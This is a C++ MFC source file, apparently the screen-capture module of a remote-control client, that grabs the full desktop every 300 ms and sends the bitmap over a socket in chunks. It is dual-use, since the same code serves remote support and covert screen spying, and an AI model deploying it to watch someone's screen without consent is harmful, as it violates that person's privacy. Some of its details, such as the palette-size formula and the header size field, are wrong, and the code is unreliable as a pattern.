#include "StdAfx.h"
#include "Screen.h"

CScreen::CScreen(void)
{
	m_pData = NULL;
	m_bFlag = true;
}

CScreen::~CScreen(void)
{
}

void CScreen::GetScreen()
{
	CDC* pDeskDC = CWnd::GetDesktopWindow()->GetDC();  //获取桌面画布对象
	CRect rect;
	CWnd::GetDesktopWindow()->GetClientRect(rect);  //获取屏幕的客户区域
	int nWidth  = GetSystemMetrics(SM_CXSCREEN);  //获取屏幕的宽度
	int nHeight = GetSystemMetrics(SM_CYSCREEN);  //获取屏幕的高度
	CDC memDC;  //内存的DC对象
	memDC.CreateCompatibleDC(pDeskDC);  //创建一个兼容的画布
	CBitmap bmp;
	bmp.CreateCompatibleBitmap(pDeskDC, nWidth, nHeight); //创建兼容位图
	memDC.SelectObject(&bmp); //选中位图对象
	BITMAP bitMap;
	bmp.GetBitmap(&bitMap);
	m_panelsize = 0;  //记录调色板的大小
	//需要增加颜色判断算法
	if (bitMap.bmBitsPixel < 16)  //判断是否是真彩色位图
	{
		m_panelsize = pow(2.0, (double)bitMap.bmBitsPixel * sizeof(RGBQUAD));
	}
	m_nHeadTotal = (int)m_panelsize + sizeof(BITMAPINFO);
	m_pBMPINFO = (BITMAPINFO*)LocalAlloc(LPTR,sizeof(BITMAPINFO)+(int)m_panelsize);
	m_pBMPINFO->bmiHeader.biBitCount      = bitMap.bmBitsPixel;//4
	m_pBMPINFO->bmiHeader.biClrImportant  = 0;
	m_pBMPINFO->bmiHeader.biCompression   = 0;
	m_pBMPINFO->bmiHeader.biHeight        = nHeight;
	m_pBMPINFO->bmiHeader.biPlanes        = bitMap.bmPlanes;
	m_pBMPINFO->bmiHeader.biSize          = sizeof(BITMAPINFO);
	m_pBMPINFO->bmiHeader.biSizeImage     = bitMap.bmWidthBytes * bitMap.bmHeight;
	m_pBMPINFO->bmiHeader.biWidth         = nWidth;
	m_pBMPINFO->bmiHeader.biXPelsPerMeter = 0;
	m_pBMPINFO->bmiHeader.biYPelsPerMeter = 0;

	memDC.BitBlt(0, 0, nWidth, nHeight, pDeskDC, 0, 0, SRCCOPY);
	m_totalSize = bitMap.bmWidthBytes * bitMap.bmHeight;
	m_pData = new BYTE[m_totalSize];
	if(0 == ::GetDIBits(memDC.m_hDC,bmp,0,bitMap.bmHeight,m_pData,m_pBMPINFO, DIB_RGB_COLORS))
	{
		printf("Return 0\n");
		//delete pData;
		m_pData = NULL;
		return;
	}
}

void CScreen::SendScreenData()  //循环发送屏幕数据
{
	while (m_bFlag)
	{
		GetScreen(); //获取屏幕数据
		SendBmpHeaderInfo();  //发送位图头数据
		SendBmpData();  //发送位图数据
		Sleep(300);
		CleanData();
	}
}

void CScreen::SendBmpHeaderInfo()
{
	BMPDATA_S bmpdata;
	memset(&bmpdata,0,sizeof(BMPDATA_S));
	bmpdata.Id = 0;
	bmpdata.bShow = false;
	bmpdata.Size = m_totalSize;
	bmpdata.HeadSize = m_nHeadTotal;
	memcpy(&bmpdata.bmpinfo, m_pBMPINFO, m_nHeadTotal);

	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_SCREEN;
	memcpy((char*)tagMsgInfo.context, (char*)&bmpdata, sizeof(BMPDATA_S));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}

void CScreen::SendBmpData()
{
	MSGINFO_S tagMsgInfo;

	BMPDATA_S tagBmpData;
	memset(&tagBmpData, 0, sizeof(BMPDATA_S));
	const int nBufSize = SCREEN_BUF_SIZE;   //一次发送数据的大小

	tagBmpData.Id = 1;
	int nCount = m_totalSize / nBufSize + 1;  //发送的次数
	if (0 == m_totalSize % nBufSize)
	{
		nCount = nCount - 1;
	}

	tagBmpData.bShow = false;  //显示图像
	UINT nBegin = 0, nEnd = nBufSize;
	for (int index = 0; index < nCount ; index++)  //循环发送
	{
		memset(&tagBmpData.Data, 0, nBufSize); //初始化数据
		memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
		tagMsgInfo.Msg_id = CMD_SCREEN;

		nBegin = index * nBufSize;  //每次开始发送数据的位置
		tagBmpData.Begin = nBegin;
		tagBmpData.Size  = 0;
		tagBmpData.HeadSize = 0;  //位图头大小默认值为0

		if (index == nCount -1)  //最后一次发送
		{
			tagBmpData.bShow = true;  //这时可以显示图像了
			tagBmpData.Id = 2;
			tagBmpData.Size = m_totalSize;  //数据的总大小
			for (UINT i = nBegin, k = 0; i < m_totalSize; i++, k++)
			{
				tagBmpData.Data[k] = m_pData[i];
			}
		}
		else
		{
			for (UINT i = nBegin, k = 0; k < nBufSize; i++, k++)
			{
				tagBmpData.Data[k] = m_pData[i];
			}
		}
		memcpy((char*)tagMsgInfo.context, (char*)&tagBmpData, sizeof(BMPDATA_S));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}
}

//清空数据
void CScreen::CleanData()
{
	if (NULL != m_pData)
	{
		delete[] m_pData;
		m_pData = NULL;
	}
	if (NULL != m_pBMPINFO)
	{
		LocalFree(m_pBMPINFO);
		m_pBMPINFO = NULL;
	}
}